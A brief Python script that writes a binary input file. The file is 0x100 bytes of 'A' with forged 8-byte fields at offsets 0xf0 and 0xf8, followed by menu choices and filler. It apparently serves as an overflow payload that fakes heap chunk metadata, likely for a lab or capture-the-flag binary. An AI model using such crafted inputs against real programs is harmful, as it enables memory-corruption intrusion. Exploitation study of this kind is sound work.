import sys
nm = bytearray(b'A'*0x100)
nm[0xf0:0xf8] = (0).to_bytes(8,'little')
nm[0xf8:0x100] = (0x60).to_bytes(8,'little')
data = bytes(nm) + b'1\n' + b'8\n' + b'ABCDEFGH'
open(sys.argv[1] if len(sys.argv)>1 else '/tmp/sc55/in1.bin','wb').write(data)
print(len(data))
